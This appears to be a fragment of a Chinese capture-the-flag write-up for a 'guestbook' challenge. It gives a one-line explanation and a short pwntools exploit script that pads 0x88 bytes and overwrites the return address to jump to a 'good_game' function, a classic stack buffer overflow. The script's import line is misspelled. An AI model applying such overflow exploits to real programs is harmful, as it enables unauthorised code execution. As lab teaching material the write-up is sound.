攻破

用0x88长度的内容做padding，然后将good_game的地址放到尾部，然后执行即可。

#coding:utf-8
#exp.py
Author = "Yof3ng"
from pwn impor *
io = process('guestbook')
good_game_addr = 0x400620
padding = 'a'*0x88
payload = padding + p64(good_game_addr)
io.recvline()
io.send(payload)
print io.recvline()
print io.recvline()
